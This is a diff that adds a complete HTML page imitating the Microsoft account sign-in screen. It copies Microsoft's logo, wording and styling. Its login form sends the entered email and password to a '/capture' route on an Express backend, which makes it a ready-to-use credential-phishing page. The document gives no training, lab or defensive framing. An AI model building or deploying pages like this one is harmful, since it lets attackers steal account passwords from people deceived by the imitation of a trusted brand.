@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your Microsoft account</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-box {
+            background: #ffffff;
+            padding: 44px;
+            width: 440px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            box-sizing: border-box;
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+        .logo-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 10px);
+            gap: 2px;
+            margin-right: 8px;
+        }
+        .logo-grid div {
+            width: 10px;
+            height: 10px;
+        }
+        .red { background-color: #f25022; }
+        .green { background-color: #7fba00; }
+        .blue { background-color: #00a4ef; }
+        .yellow { background-color: #ffb900; }
+        .logo-text {
+            font-size: 15px;
+            font-weight: 600;
+            color: #5e5e5e;
+        }
+        h2 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-top: 0;
+            margin-bottom: 16px;
+        }
+        input[type="email"], input[type="password"] {
+            width: 100%;
+            padding: 8px 0;
+            border: none;
+            border-bottom: 1px solid #666;
+            font-size: 15px;
+            outline: none;
+            margin-bottom: 24px;
+            box-sizing: border-box;
+        }
+        input:focus {
+            border-bottom: 2px solid #0067b8;
+        }
+        .btn-container {
+            display: flex;
+            justify-content: flex-end;
+        }
+        .btn {
+            background-color: #0067b8;
+            color: white;
+            border: none;
+            padding: 10px 32px;
+            font-size: 15px;
+            cursor: pointer;
+        }
+        .btn:hover {
+            background-color: #005da6;
+        }
+        .forgot-link {
+            font-size: 13px;
+            color: #0067b8;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 16px;
+        }
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <div class="logo">
+            <div class="logo-grid">
+                <div class="red"></div>
+                <div class="green"></div>
+                <div class="blue"></div>
+                <div class="yellow"></div>
+            </div>
+            <div class="logo-text">Microsoft</div>
+        </div>
+        <h2>Sign in</h2>
+        
+        <!-- Submits form data to your Express backend route (/capture) -->
+        <form action="/capture" method="POST">
+            <div>
+                <input type="email" name="email" placeholder="Email, phone, or Skype" required>
+            </div>
+            <div>
+                <input type="password" name="password" placeholder="Password" required>
+            </div>
+            <a href="#" class="forgot-link">Can't access your account?</a>
+            <div class="btn-container">
+                <button type="submit" class="btn">Sign in</button>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
